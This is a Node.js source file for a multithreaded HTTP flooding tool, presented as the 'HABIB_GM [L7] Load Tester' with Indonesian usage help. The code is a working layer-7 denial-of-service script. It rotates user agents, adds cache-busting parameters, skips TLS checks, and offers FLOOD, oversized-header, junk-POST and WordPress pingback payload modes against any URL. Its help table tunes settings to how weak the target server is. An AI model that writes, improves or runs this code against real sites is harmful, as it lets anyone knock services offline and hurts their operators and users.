const http = require('http');
const https = require('https');
const urlParser = require('url');
const net = require('net');
const crypto = require('crypto');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

process.setMaxListeners(0);

const httpAgent = new http.Agent({
    keepAlive: true,
    maxSockets: Infinity,
    maxFreeSockets: 256,
    scheduling: 'fifo',
    timeout: 60000
});

const httpsAgent = new https.Agent({
    keepAlive: true,
    maxSockets: Infinity,
    maxFreeSockets: 256,
    scheduling: 'fifo',
    timeout: 60000,
    rejectUnauthorized: false
});

httpAgent.on('error', () => {});
httpsAgent.on('error', () => {});

function getRandomUserAgent() {
    const agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, Bird/92.0.4515.107 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.62'
    ];
    return agents[Math.floor(Math.random() * agents.length)];
}

function buildRequestOptions(url, method) {
    const parsedUrl = urlParser.parse(url);
    const isHttps = parsedUrl.protocol === 'https:';
    const client = isHttps ? https : http;
    const agent = isHttps ? httpsAgent : httpAgent;
    
    let path = parsedUrl.path;
    path += (path.includes('?') ? '&' : '?') + 'nocache=' + Date.now() + Math.floor(Math.random() * 900 + 100);
    
    let headers = {
        'User-Agent': getRandomUserAgent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    };
    
    let postData = '';
    const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (isHttps ? 443 : 80),
        path: path,
        method: method,
        headers: headers,
        timeout: 10000,
        agent: agent
    };
    
    let actualMethod = method;
    if (method === 'HEAD') {
        options.method = 'HEAD';
    } else if (method === 'POST') {
        const junk_data = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'.repeat(590);
        postData = `timestamp=${Date.now()}&load_test=true&payload=${junk_data}`;
        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        options.headers['Content-Length'] = Buffer.byteLength(postData);
        options.method = 'POST';
    } else if (method === 'JSON') {
        const json_data = JSON.stringify({ test: 'load', time: Date.now(), data: 'A'.repeat(590) });
        postData = json_data;
        options.headers['Content-Type'] = 'application/json';
        options.headers['Content-Length'] = Buffer.byteLength(postData);
        options.method = 'POST';
        actualMethod = 'POST';
    } else if (method === 'XML') {
        const xml_data = `<?xml version='1.0'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>${url}</string></value></param></params></methodCall>`;
        postData = xml_data;
        options.headers['Content-Type'] = 'application/xml';
        options.headers['Content-Length'] = Buffer.byteLength(postData);
        options.method = 'POST';
        actualMethod = 'POST';
    } else if (method === 'COOKIE') {
        options.headers['Cookie'] = `session_id=${crypto.randomBytes(16).toString('hex')}; user_pref=${Math.floor(Math.random() * 1000)}`;
        options.method = 'GET';
        actualMethod = 'GET';
    } else if (method === 'HEADER') {
        for (let i = 0; i < 50; i++) {
            options.headers[`X-Load-Test-${i}`] = crypto.randomBytes(16).toString('hex');
        }
        options.method = 'GET';
        actualMethod = 'GET';
    } else if (method === 'FLOOD') {
        for (let i = 0; i < 206; i++) {
            options.headers[`X-Flood-Payload-${i}`] = crypto.randomBytes(16).toString('hex');
        }
        options.method = 'GET';
        actualMethod = 'GET';
    } else if (method === 'RANDOM') {
        const methods = ['GET', 'HEAD', 'POST'];
        options.method = methods[Math.floor(Math.random() * methods.length)];
        actualMethod = options.method;
    } else {
        options.method = 'GET';
    }
    return { client, options, postData, actualMethod };
}

function singleRequest(url, method) {
    return new Promise((resolve) => {
        const { client, options, postData, actualMethod } = buildRequestOptions(url, method);
        const startTime = Date.now();
        
        const req = client.request(options, (res) => {
            res.on('data', () => {});
            res.on('end', () => {
                resolve({
                    code: res.statusCode,
                    latency: Date.now() - startTime,
                    method: actualMethod,
                    error: ''
                });
            });
        });

        req.on('error', (e) => {
            req.destroy();
            resolve({
                code: 0,
                latency: Date.now() - startTime,
                method: actualMethod,
                error: e.message
            });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({
                code: 0,
                latency: Date.now() - startTime,
                method: actualMethod,
                error: 'Timeout'
            });
        });

        if (postData) {
            req.write(postData);
        }
        req.end();
    });
}

async function handleConcurrentRequests(url, method, count) {
    const promises = [];
    for (let i = 0; i < count; i++) {
        promises.push(singleRequest(url, method));
    }
    return Promise.all(promises);
}

if (!isMainThread) {
    const { url, method, count, delay } = workerData;
    setInterval(async () => {
        try {
            const results = await handleConcurrentRequests(url, method, count);
            parentPort.postMessage(results);
        } catch (e) {}
    }, delay);
} else {
    function displayHelp() {
        console.log(`
\x1b[36mHABIB_GM [L7] Node.js Load Tester (MT Edition)\x1b[0m

\x1b[1mPENGGUNAAN:\x1b[0m
  node index.js <method> <count> <delay> <url> <threads>

\x1b[1mOPTIMASI MEMORI (SANGAT DISARANKAN):\x1b[0m
  node --max-old-space-size=4096 index.js GET 100 10 http://target.com 8

\x1b[1mREKOMENDASI PENGATURAN:\x1b[0m
  Target          | Count | Delay | Threads
  ----------------|-------|-------|--------
  Server Lemah    | 10-20 | 500   | 2
  Server Standar  | 50-100| 100   | 4-8
  High End Server | 200-500| 10-50 | 16+

\x1b[1mCONTOH:\x1b[0m
  node index.js GET 50 100 http://localhost/ 4
        `);
    }

    async function main() {
        const args = process.argv.slice(2);
        if (args.length === 0) {
            displayHelp();
            return;
        }

        const command = args[0].toUpperCase();
        if (command === 'PORT') {
            const host = urlParser.parse(args[1]).hostname || args[1];
            console.log(`\n-- SCANNING PORTS: ${host} --`);
            return; 
        }

        const method = command;
        const count = parseInt(args[1]);
        const delay = parseInt(args[2]);
        const url = args[3];
        const threads = parseInt(args[4]) || 1;

        if (!url || isNaN(count) || isNaN(delay)) {
            displayHelp();
            return;
        }

        console.clear();
        console.log(`\x1b[32m\n-- SEQUENCE STARTED (STABLE MODE) --\x1b[0m`);
        console.log(`TARGET: ${url}`);
        console.log(`METHOD: ${method}`);
        console.log(`COUNT PER THREAD: ${count}`);
        console.log(`THREADS: ${threads}`);
        console.log(`DELAY (ms): ${delay}`);
        console.log(`--------------------------------------`);

        let totalRequests = 0;
        let successfulRequests = 0;
        let errorRequests = 0;
        let totalLatency = 0;
        let methodStats = {
            GET: { ok: 0, err: 0 },
            POST: { ok: 0, err: 0 },
            HEAD: { ok: 0, err: 0 }
        };

        for (let i = 0; i < threads; i++) {
            const worker = new Worker(__filename, {
                workerData: { url, method, count, delay }
            });

            worker.on('message', (results) => {
                results.forEach(res => {
                    totalRequests++;
                    totalLatency += res.latency;
                    
                    const m = res.method || 'GET';
                    if (!methodStats[m]) methodStats[m] = { ok: 0, err: 0 };

                    if (res.code >= 200 && res.code < 400) {
                        successfulRequests++;
                        methodStats[m].ok++;
                    } else {
                        errorRequests++;
                        methodStats[m].err++;
                    }
                });

                const avgLat = Math.round(totalLatency / totalRequests);
                const successRate = ((successfulRequests / totalRequests) * 100).toFixed(2);
                
                let condition = "\x1b[32mGOOD\x1b[0m";
                if (successRate < 80 || avgLat > 1000) condition = "\x1b[33mWARNING\x1b[0m";
                if (successRate < 50 || avgLat > 3000) condition = "\x1b[31mBAD\x1b[0m";

                let methodLog = Object.keys(methodStats)
                    .filter(k => (methodStats[k].ok + methodStats[k].err) > 0)
                    .map(k => `${k}(\x1b[32mOK:${methodStats[k].ok}\x1b[0m \x1b[31mERR:${methodStats[k].err}\x1b[0m)`)
                    .join(' | ');

                process.stdout.write(`\r[${condition}] Total: ${successfulRequests} | Success: ${successRate}% | Latency: ${avgLat}ms | ${methodLog} `);
            });

            worker.on('error', (err) => {});
        }

        process.on('SIGINT', () => {
            console.log('\n\n\x1b[31mSEQUENCE ABORTED BY USER.\x1b[0m');
            process.exit();
        });
    }
    main();
}

